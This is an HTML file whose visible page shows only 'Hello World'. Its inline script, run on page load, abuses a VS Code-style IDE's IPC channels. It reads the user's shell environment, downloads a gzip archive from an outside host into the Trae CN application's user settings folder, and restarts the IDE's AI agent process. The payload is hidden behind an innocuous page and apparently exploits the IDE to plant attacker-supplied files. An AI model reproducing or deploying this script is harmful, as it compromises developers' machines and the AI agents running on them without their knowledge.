<!DOCTYPE html>
<html>
<head>
<title>Hello World</title>
<style>
    body {
        font-family: Arial, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
        background-color: #f0f0f0;
    }
    .container {
        text-align: center;
        background: white;
        padding: 2rem;
        border-radius: 8px;
        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    }
    h1 {
        color: #333;
        margin-bottom: 1rem;
    }
    p {
        color: #666;
        margin: 0;
    }
</style>
</head>
<body>
    <div class="container">
        <h1>Hello World!</h1>
    </div>
    <script>
      (async () => {
        // --- 1) Fetch shell env (invoke-style, sender-gated) ---
        let env;
        try {
          env = await vscode.ipcRenderer.invoke('vscode:fetchShellEnv');
          console.log('[fetchShellEnv]', env);
        } catch (e) {
          console.warn('[fetchShellEnv] error:', String(e));
          return;
        }

        // --- 2) Derive username safely (macOS) ---
        const fromHome =
          typeof env?.HOME === 'string' && env.HOME.startsWith('/Users/')
            ? env.HOME.split('/')[2]
            : null;
        const username = (fromHome || env?.USER || env?.LOGNAME || '').trim();

        // Validate to avoid odd characters ending up in a path
        if (!username || !/^[A-Za-z0-9._-]+$/.test(username)) {
          console.warn('Could not determine a safe username from env:', { HOME: env?.HOME, USER: env?.USER, LOGNAME: env?.LOGNAME });
          return;
        }
        console.log('[username]', username);

        // --- 3) Build the target directory (no backslashes needed in JS) ---
        const targetDir = "/Users/" + username + "/Library/Application\ Support/Trae\ CN/User";

        // --- 4) Prepare download context ---
        const context = {
          downloadUrl: 'https://trae.jackfromeast.site/gg.gzip',
          targetDir,
          contentType: 'gzip',
          windowId: 1
        };

        // --- 5) Start download (invoke) ---
        let res;
        try {
          res = await vscode.ipcRenderer.invoke('vscode:icube.download', { status: 'start', context });
          console.log('[download]', res);
        } catch (e) {
          console.warn('[download invoke err]', String(e));
          return;
        }

        if (!res || res.success === false) {
          console.warn('Download failed or was rejected:', res?.message || res);
          return;
        }

        await new Promise(r => setTimeout(r, 500));

        // --- 6) Restart the agent process (invoke; may be sender-gated) ---
        try {
          const restartRes = await vscode.ipcRenderer.invoke('vscode:sandbox::main-icube-restart-ai-agent-process', { windowId: 1 });
          console.log('[restart invoke]', restartRes);
        } catch (e) {
          console.warn('[restart invoke err]', String(e));
        }
      })();
    </script>
</body>
</html>